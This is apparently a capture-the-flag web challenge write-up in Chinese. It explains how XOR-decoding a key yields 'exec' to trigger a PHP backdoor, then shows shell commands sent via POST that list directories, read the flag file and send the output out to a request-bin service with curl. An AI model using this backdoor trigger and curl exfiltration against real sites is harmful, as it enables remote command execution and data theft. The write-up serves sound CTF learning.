## WEB 解法
先把檔案放到 local 端做測試，先上網找 [php danger function](https://stackoverflow.com/questions/3115559/exploitable-php-functions)，決定用 exec
先解出什麼東西 ^ d00r 會是 exec:
```
i = b'd00r'
j = b'exec'
print(bytes([i ^ j for i, j in zip(i, j)]))
```
結果為 b'\x01HU\x11' ，所以 GET 送 %01HU%11，post 就可以放要執行的 shell 指令。
"_\x50\x4f\x53\x54" 為 _POST , c 為 ＃ ，因此可以送出指令，我這邊用免費的線上 [request server](https://requestbin.com/) 送出指令
先傳 `ls …/…/…/ > /tmp/rar.txt | /tmp/qq.txt & curl -X POST -T /tmp/rar.txt` 測出 flag 的位置，再傳 `cat ../../../flag_is_here  >> /tmp/qq.txt & curl -X POST -T /tmp/qq.txt` 就能得到 flag 了。
(/temp 沒有擋寫入檔案)
